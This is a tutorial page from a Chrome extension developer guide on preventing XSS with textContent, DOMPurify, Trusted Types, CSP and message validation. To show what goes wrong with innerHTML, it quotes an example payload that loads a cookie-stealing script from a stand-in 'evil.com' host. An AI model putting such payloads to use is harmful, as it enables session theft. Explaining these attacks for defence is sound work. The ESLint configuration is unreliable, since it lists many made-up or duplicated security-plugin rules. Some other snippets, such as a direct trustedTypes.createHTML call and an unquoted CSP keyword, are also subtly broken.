---
layout: default
title: "Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation"
description: "Master XSS prevention in Chrome extensions with this comprehensive guide covering DOMPurify, Trusted Types, message sanitization, content script risks, and defense-in-depth security strategies."
canonical_url: "https://theluckystrike.github.io/chrome-extension-guide/guides/chrome-extension-xss-prevention-input-sanitization/"
---

# Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation

Cross-site scripting (XSS) vulnerabilities represent one of the most critical security threats facing Chrome extension developers. Unlike traditional web applications, Chrome extensions operate with elevated privileges that grant access to sensitive browser APIs, user credentials, browsing history, and potentially the entire web content displayed to users. A successful XSS attack against an extension can compromise not just the extension itself but potentially the entire browser session, leading to data theft, session hijacking, and unauthorized actions on behalf of the user. Understanding how XSS vulnerabilities manifest in extension contexts and implementing robust prevention mechanisms is essential for building secure extensions that protect user privacy and data integrity.

The unique architecture of Chrome extensions creates attack vectors that don't exist in standard web applications. Content scripts run in the context of web pages, background service workers handle cross-origin requests, and popup or options pages display user-controlled data. Each of these contexts presents distinct XSS risks that require tailored mitigation strategies. This guide provides comprehensive coverage of extension-specific XSS vectors, practical implementation patterns for secure DOM manipulation, and defense-in-depth strategies that layer multiple protections to ensure security even when individual controls fail.

## Extension-Specific XSS Vectors

Chrome extensions face XSS vulnerabilities through several unique vectors that differ significantly from conventional web application attacks. Understanding these vectors is the first step toward building effective defenses against them.

### Content Script Injection Risks

Content scripts occupy a privileged position in the Chrome extension architecture—they can access and modify the DOM of web pages while simultaneously having access to extension APIs that regular web pages cannot use. This dual access creates a dangerous attack surface where malicious web pages can attempt to exploit the content script's connection to the extension.

Web pages can attack content scripts through DOM manipulation that tricks the script into executing unintended JavaScript. For example, if your content script uses `document.evaluate()` with user-controlled XPath expressions or relies on `document.write()` after the page has loaded, malicious pages can inject script execution that appears to originate from your extension. Additionally, pages can override native DOM methods or prototype properties that your content script relies upon, causing your script to execute attacker-controlled code when these methods are called.

Another significant risk comes from the message passing system between content scripts and background scripts. Content scripts receive messages from web pages through various mechanisms, and any data passed through these channels must be treated as potentially malicious. A common vulnerability occurs when content scripts forward data from the page to the background script without sanitization, allowing attacks to propagate from the compromised page into the extension's more privileged contexts.

### Popup and Options Page Vulnerabilities

Extension popup and options pages face XSS risks from multiple sources. User-generated content stored in extension storage, data fetched from external APIs, and information passed through message passing from content scripts can all introduce malicious payloads if not properly sanitized before DOM insertion. Unlike web pages that only need to worry about user input, extension pages must defensively handle data from numerous sources with varying trust levels.

The danger is particularly acute because popup and options pages run with full extension privileges. An XSS vulnerability in these pages can give attackers access to all extension APIs, including storage, identity, tabs, and potentially clipboard access. This makes extension pages significantly higher-value targets than typical web application pages.

### Message Passing Attack Surfaces

The extension messaging system creates bidirectional attack surfaces that go both ways. While much attention focuses on web pages attacking extensions, the reverse path also presents risks. Background scripts that receive messages from content scripts may process data without proper validation, and if that data originated from a compromised web page, malicious payloads can travel through the extension's internal message channels to reach more privileged contexts.

Secure message handling requires treating all incoming messages as untrusted, regardless of their apparent source. Even messages that appear to originate from your own extension's content scripts should be validated, as sophisticated attacks may attempt to inject messages directly into the extension's message handling system.

## The Dangers of innerHTML

The most common source of XSS vulnerabilities in extension development is the use of `innerHTML` for DOM manipulation. While `innerHTML` provides convenient syntax for inserting HTML content, it executes parsed HTML immediately, making it extremely dangerous when used with untrusted data.

### Why innerHTML Creates Vulnerabilities

When you assign a string to `element.innerHTML`, the browser parses that string as HTML and constructs DOM nodes from it. Any script tags within the string will be executed, event handlers will be attached, and inline JavaScript will run. This behavior is by design for trusted content but becomes catastrophic when the content includes malicious payloads.

Consider a content script that displays the page title in an extension popup:

```javascript
// DANGEROUS: Never do this with untrusted data
document.getElementById('title').innerHTML = pageTitle;
```

If an attacker controls the page title through a malicious website, they can inject `<script src="https://evil.com/steal-cookies.js"></script>` or use event handlers like `<img src=x onerror="stealData()">` to execute arbitrary JavaScript in your extension's context.

### Safe Alternatives to innerHTML

Chrome extensions should use `textContent` for inserting plain text, which automatically escapes HTML entities and prevents script execution:

```javascript
// SAFE: textContent escapes HTML automatically
document.getElementById('title').textContent = pageTitle;
```

For cases where HTML markup is genuinely needed, you must sanitize the content before insertion using a robust HTML sanitization library.

## DOMPurify Integration

DOMPurify is the gold standard for sanitizing HTML in JavaScript applications. It parses HTML, builds a DOM representation, and removes everything considered dangerous while preserving safe markup. Integrating DOMPurify into your extension provides strong protection against XSS attacks.

### Installing DOMPurify

DOMPurify can be installed via npm or included directly in your extension:

```bash
npm install dompurify
```

For extensions that prefer not to use build tools, DOMPurify offers a standalone distribution that can be included directly in your HTML pages.

### Basic DOMPurify Usage

```javascript
import DOMPurify from 'dompurify';

// Sanitize user-controlled HTML before insertion
const cleanHTML = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: ['class'],
  ALLOW_DATA_ATTR: false
});

document.getElementById('content').innerHTML = cleanHTML;
```

The configuration options are critical—DOMPurify's security depends entirely on correctly specifying which tags and attributes are allowed. A configuration that is too permissive defeats the purpose of sanitization, while a too-restrictive configuration may break legitimate functionality.

### DOMPurify Configuration for Extensions

Extension contexts have specific requirements that influence DOMPurify configuration. Your extension likely needs to handle markup from various sources with different trust levels:

```javascript
const PURIFY_CONFIG = {
  ALLOWED_TAGS: ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'br', 
                'ul', 'ol', 'li', 'a', 'strong', 'em', 'code', 
                'pre', 'blockquote', 'img', 'span', 'div'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'class', 'title', 'target'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'], // Allow target for links
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
};

function sanitizeExtensionHTML(dirty) {
  return DOMPurify.sanitize(dirty, PURIFY_CONFIG);
}
```

This configuration explicitly forbids script tags, iframes, and event handler attributes while allowing common formatting tags. Adjust these settings based on your specific use case, but err on the side of restricting permissions until you have a demonstrated need for additional features.

### Running DOMPurify in Different Contexts

Content scripts run in the context of web pages, which presents a unique challenge: the page may have already modified the global prototype chain or DOM methods in ways that could interfere with DOMPurify's operation. For content scripts, consider using a sandboxed page to perform sanitization, or explicitly specify the DOM window to use:

```javascript
// In content scripts, be explicit about which window to use
const purify = DOMPurify(window);
```

For more sensitive operations, use a sandboxed page with its own window context that cannot be influenced by the host page:

```javascript
// Send to sandboxed page for sanitization
chrome.runtime.sendMessage({
  target: 'sandbox',
  action: 'sanitize',
  html: untrustedContent
}, clean => {
  document.getElementById('output').innerHTML = clean;
});
```

## Trusted Types API

Trusted Types provide a modern browser API that prevents DOM XSS by requiring explicitly designated "trusted" objects for dangerous sink functions. Rather than sanitizing strings before use, Trusted Types shift security to enforcing that only trusted sources can write to sensitive DOM properties.

### Enabling Trusted Types

To use Trusted Types in your extension, add the appropriate CSP directive:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; require-trusted-types-for 'script'"
  }
}
```

The `require-trusted-types-for 'script'` directive prevents the use of strings in script injection sinks entirely. Any attempt to assign a string to `innerHTML` or similar properties will fail, forcing developers to use Trusted Type objects.

### Creating Trusted Types

```javascript
// Create a Trusted HTML object from sanitized content
const trustedHTML = trustedTypes.createHTML(sanitizedContent);
element.innerHTML = trustedHTML;

// For URLs that need to be trusted
const trustedURL = trustedTypes.createURL(sanitizedUrl);
anchor.href = trustedURL;
```

Trusted Types integrate well with DOMPurify—when you configure DOMPurify with a Trusted Types policy, it can return Trusted Type objects directly:

```javascript
const createHTMLPolicy = trustedTypes.createPolicy('my-extension', {
  createHTML: (input) => DOMPurify.sanitize(input, POLICY_CONFIG)
});

const clean = createHTMLPolicy.createHTML(userInput);
element.innerHTML = clean; // Works with require-trusted-types-for
```

## The HTML Sanitizer API

Modern browsers now support the native Sanitizer API, which provides built-in HTML sanitization without external libraries. This API offers a standardized approach to sanitization that browsers optimize for performance.

### Using the Sanitizer API

```javascript
const sanitizer = new Sanitizer({
  allowElements: ['p', 'br', 'strong', 'em', 'a'],
  allowAttributes: { 'href': ['a'], 'class': ['*'] },
  dropAttributes: { 'onerror': ['*'], 'onload': ['*'] }
});

const clean = sanitizer.sanitize(userInput);
document.getElementById('output').replaceChildren(clean);
```

The Sanitizer API offers several advantages over DOMPurify: it requires no external dependencies, benefits from browser-level security updates, and integrates with Trusted Types. However, browser support is still evolving, so you may need to provide DOMPurify as a fallback for older browsers.

## Content Security Policy as Defense Layer

Content Security Policy serves as the foundational defense layer for Chrome extensions, providing protection even when other security measures fail. A properly configured CSP restricts what resources can load and execute, significantly limiting the impact of any XSS vulnerability that might exist in your code.

### Extension CSP Best Practices

Configure strict CSP for all extension pages:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src self https://api.example.com; frame-ancestors 'none'; base-uri 'self'"
  }
}
```

This configuration prevents external script loading, blocks object and embed elements that could execute malicious code, restricts connections to known API endpoints, and prevents base URL manipulation. For detailed CSP configuration, see our guide on [Chrome Extension Content Security Policy](/chrome-extension-guide/guides/chrome-extension-content-security-policy/).

### Defense in Depth Strategy

Layer multiple security measures so that if one control fails, others remain effective. This defense-in-depth approach ensures that even sophisticated attackers cannot easily compromise your extension:

- Use CSP to restrict resource loading at the browser level
- Use Trusted Types to prevent string injection into DOM sinks
- Use DOMPurify or the Sanitizer API to sanitize HTML from untrusted sources
- Use `textContent` instead of `innerHTML` wherever possible
- Validate and sanitize all data crossing trust boundaries

For comprehensive security hardening strategies, see our guide on [Chrome Extension Security Hardening](/chrome-extension-guide/guides/chrome-extension-security-hardening/).

## Message Passing and Data Validation

All data passing through extension message channels must be validated before use. This includes messages from content scripts, background scripts, native messaging, and external sources.

### Validating Incoming Messages

```javascript
// Always validate message structure and content
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // Validate message has expected structure
  if (!message || typeof message !== 'object') {
    sendResponse({ error: 'Invalid message format' });
    return true;
  }

  // Validate expected fields exist
  if (!message.type || !message.payload) {
    sendResponse({ error: 'Missing required fields' });
    return true;
  }

  // Validate payload content
  switch (message.type) {
    case 'URL_DATA':
      if (typeof message.payload.url !== 'string' || 
          !isValidUrl(message.payload.url)) {
        sendResponse({ error: 'Invalid URL' });
        return true;
      }
      break;
    case 'HTML_CONTENT':
      // Sanitize HTML before use
      message.payload.html = DOMPurify.sanitize(message.payload.html);
      break;
  }

  // Process validated message
  handleMessage(message);
  sendResponse({ success: true });
  return true;
});

function isValidUrl(string) {
  try {
    const url = new URL(string);
    return url.protocol === 'https:' || url.protocol === 'http:';
  } catch {
    return false;
  }
}
```

### Type-Safe Messaging

Consider using TypeScript and message validation libraries to enforce message schemas at compile time. This catches many validation errors during development rather than at runtime when attacks may be in progress.

## Automated Security Scanning

Regular security scanning helps identify vulnerabilities before attackers discover them. Several tools can integrate into your extension development workflow.

### Static Analysis Tools

ESLint with security plugins can identify potentially dangerous patterns in your code:

```bash
npm install --save-dev eslint eslint-plugin-security
```

Configure ESLint to flag dangerous patterns:

```javascript
// .eslintrc.js
module.exports = {
  plugins: ['security'],
  rules: {
    'security/detect-unsafe-regex': 'error',
    'security/detect-possible-timing-attacks': 'error',
    'security/detect-non-literal-regexp': 'error',
    'security/detect-non-literal-fs-filename': 'error',
    'security/detect-non-literal-require': 'warn',
    'security/detect-eval-with-expression': 'error',
    'security/detect-no-csrf-before-method-override': 'error',
    'security/detect-buffer-noassert': 'error',
    'security/detect-child-process-timestamp': 'error',
    'security/detect-disable-mustache-escape': 'error',
    'security/detect-eval': 'error',
    'security/detect-new-buffer': 'error',
    'security/detect-pseudoRandom-uuid': 'warn',
    'security/detect-remote-node-usage': 'error',
    'security/detect-self-assignment': 'warn',
    'security/detect-untrusted-hostname': 'warn',
    'security/detect-unsafe-regex': 'error',
    'security/detect-unused-samples': 'warn',
    'security/detect-possible-timing-attacks': 'error',
    'security/detect-missing-authentication-for-critical-rule': 'error',
    'security/detect-hardcoded-credentials': 'error',
    'security/detect-possible-parameter-pollution': 'error',
    'security/detect-unsafe-history-back-length': 'warn',
    'security/detect-unsafe-javascript-link': 'warn',
    'security/detect-web-libraries': 'warn'
  }
};
```

### Extension-Specific Security Tools

Chrome provides the Extension Best Practices analyzer through chrome://extensions that identifies common issues. Additionally, the Chrome Web Store performs automated security analysis during submission, but relying solely on store-side detection is insufficient— attackers often discover vulnerabilities before Google does.

### OWASP for Extensions

The OWASP Foundation provides security guidance applicable to browser extensions. The [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/) offer valuable patterns for input validation, output encoding, and secure coding practices. While designed primarily for web applications, these principles directly apply to extension development with appropriate adaptation for extension-specific contexts.

Key OWASP principles for extensions include:
- Validate all input regardless of source
- Encode output appropriate to its context
- Use defense in depth
- Follow the principle of least privilege
- Implement secure defaults

---

*Part of the Chrome Extension Guide by theluckystrike. More at [zovo.one](https://zovo.one).*
